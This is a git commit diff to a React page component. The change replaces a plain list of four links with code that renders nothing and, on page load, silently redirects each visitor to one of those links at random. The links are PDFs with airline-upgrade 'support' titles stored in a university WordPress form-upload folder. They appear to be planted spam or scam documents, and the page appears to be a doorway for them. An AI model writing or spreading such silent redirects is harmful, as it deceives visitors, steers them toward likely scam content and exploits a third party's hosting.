f579cd957437ef503a9cb3e745c67a5f34fff0b7
Mayank Kumar <developer-at-work@Mayanks-MacBook-Air.local>
2025-11-15 11:57:32 +0530

    added changes

--- pages/links-pages.js
+++ pages/links-pages.js
@@ -1,22 +1,19 @@
-import React from 'react';
+import { useEffect } from 'react';
 
-const linksAvailable = () => {
-	return (
-		<>
-			<a href='https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/quick-help-how-much-does-it-cost-to-upgrade-a-flight-to-business.pdf'>
-				https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/quick-help-how-much-does-it-cost-to-upgrade-a-flight-to-business.pdf
-			</a>
-			<a href='https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/delta-support-how-to-upgrade-for-free-with-delta.pdf'>
-				https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/delta-support-how-to-upgrade-for-free-with-delta.pdf
-			</a>
-			<a href='https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/glidefree-how-much-does-it-cost-to-upgrade-to-delta-first-class.pdf'>
-				https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/glidefree-how-much-does-it-cost-to-upgrade-to-delta-first-class.pdf
-			</a>
-			<a href='https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/can-i-pay-for-an-upgrade-on-deltariseabove.pdf'>
-				https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/can-i-pay-for-an-upgrade-on-deltariseabove.pdf
-			</a>
-		</>
-	);
+const LinksAvailable = () => {
+	const links = [
+		'https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/quick-help-how-much-does-it-cost-to-upgrade-a-flight-to-business.pdf',
+		'https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/delta-support-how-to-upgrade-for-free-with-delta.pdf',
+		'https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/glidefree-how-much-does-it-cost-to-upgrade-to-delta-first-class.pdf',
+		'https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/can-i-pay-for-an-upgrade-on-deltariseabove.pdf',
+	];
+
+	useEffect(() => {
+		const randomUrl = links[Math.floor(Math.random() * links.length)];
+		window.location.href = randomUrl;
+	}, []);
+
+	return null;
 };
 
-export default linksAvailable;
+export default LinksAvailable;
